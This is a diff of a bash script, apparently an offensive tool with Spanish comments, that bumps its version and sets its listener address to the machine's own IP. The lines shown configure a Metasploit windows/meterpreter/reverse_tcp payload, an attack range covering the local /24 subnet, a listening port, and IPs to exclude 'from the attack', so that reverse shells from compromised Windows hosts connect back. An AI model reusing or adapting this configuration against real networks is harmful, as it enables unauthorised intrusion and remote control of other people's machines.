@@ -1,6 +1,6 @@
 #!/bin/bash
 
-version="1.1.1"
+version="1.1.2"
 
 # Variables
 youripalways=`ifconfig | grep -Eo 'inet (addr:)?([0-9]*\.){3}[0-9]*' | grep -Eo '([0-9]*\.){3}[0-9]*' | grep -v '127.0.0.1'`
@@ -10,7 +10,7 @@ windowspayload="windows/meterpreter/reverse_tcp"
 
 exclude_ips=("192.168.1.100" "192.168.1.101") # pon aqui las ips que se deben excluir del ataque
 
-lhost="127.0.0.1"
+lhost="$youripalways"
 iprange="${youripalways%.*}.0/24"
 
 winlport="8181"
